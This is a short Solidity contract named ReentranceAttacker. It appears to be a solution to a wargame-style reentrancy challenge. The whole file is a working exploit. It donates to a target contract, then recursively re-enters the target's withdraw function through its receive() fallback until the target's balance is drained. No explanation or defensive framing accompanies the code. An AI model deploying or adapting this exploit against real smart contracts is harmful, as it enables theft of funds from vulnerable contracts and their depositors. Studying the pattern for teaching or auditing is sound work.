// SPDX-License-Identifier: MIT
pragma solidity ^0.7.3;

interface IReentrance {
  function donate(address _to) external payable;
  function withdraw(uint _amount) external;
}

contract ReentranceAttacker {
  IReentrance reentrance;
  uint256 increment;

  event Amount(string _msg, uint _amount);
  event Msg(string _msg);

  constructor(address _address) {
    reentrance = IReentrance(_address);
  }

  function attack() public payable {
    increment = msg.value;
    emit Amount("donate", increment);
    reentrance.donate{ value: increment }(address(this));
    emit Amount("withdraw", increment);
    withdraw();
  }

  function withdraw() private {
    uint256 bal = address(reentrance).balance;
    emit Amount("current balance", bal);
    uint256 amountToWithdraw;
    if (bal > 0) {
      if (bal < increment) {
        amountToWithdraw = bal;
      } else {
        amountToWithdraw = increment;
      }
      emit Amount("reentrantly withdrawing", amountToWithdraw);
      reentrance.withdraw(amountToWithdraw);
    } else {
      emit Msg("Coffers are emptied!");
    }

  }

  receive() external payable {
    withdraw();
  }

}
